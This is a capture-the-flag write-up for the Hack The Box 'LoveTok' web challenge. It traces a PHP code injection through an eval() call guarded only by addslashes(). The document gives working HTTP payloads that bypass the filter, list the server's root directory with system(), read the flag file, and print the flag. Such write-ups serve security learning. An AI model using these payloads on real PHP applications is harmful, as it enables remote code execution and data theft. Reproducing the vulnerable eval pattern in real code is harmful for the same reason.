# [LoveTok](https://app.hackthebox.com/challenges/lovetok)

## CHALLENGE DESCRIPTION

True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin' (at your door). Come and check it out, but don't try to cheat love because love cheats back. ðŸ’›

## Scan

Burpsuite scanner: detected `PHP code injection`.

- request:

  ```http
  GET /?format=r%7b$%7bsleep(hexdec(dechex(20)))%7d%7d HTTP/1.1
  ```

- Issue detail: The format parameter appears to be vulnerable to PHP code injection attacks. The submitted value appears to be placed into a dynamically evaluated PHP statement, within a `double-quoted` context.  The payload `{${sleep(hexdec(dechex(20)))}}` was submitted in the format parameter. The application took 20004 milliseconds to respond to the request, compared with 0 milliseconds for the original request, indicating that the injected PHP code caused a time delay.

## Source code review

TimeController.php:

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

- user controlled parameter `format` is passed to `TimeModel` class, then the `getTime` function is called.

TimeModel.php:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

- 1. `format` variable -> addslashes() method
- 2. `format` variable -> eval() method => code injection happened here.

## addslashes() method

Returns a string with backslashes added before characters that need to be escaped. These characters are:

- single quote (')
- double quote (")
- backslash (\)
- NUL (the NUL byte)

## bypass addslashes() + eval()

because just only the `format` parameter go through `addslashes()` method, we can use another parameter to bypass this.

```http
GET /?format=${eval($_GET[1])}&1=phpinfo()%3b HTTP/1.1
```

=> phpinfo() page is returned

## get flag

solution 1: i tried oob interaction but failed both with burp suite collaborator and pipedream, maybe it's blocked.

solution 2: directly echo

- find flag file name:

  ```http
  GET /?format=${eval($_GET[1])}&1=echo+system('ls+/')%3b HTTP/1.1

  HTTP/1.1 200 OK

  bin
  boot
  dev
  entrypoint.sh
  etc
  flagNqwnA
  home
  ...
  ```

- get the flag:

  ```http
  GET /?format=${eval($_GET[1])}&1=echo+system('cat+/flagNqwnA')%3b HTTP/1.1

  HTTP/1.1 200 OK

  HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
  ```
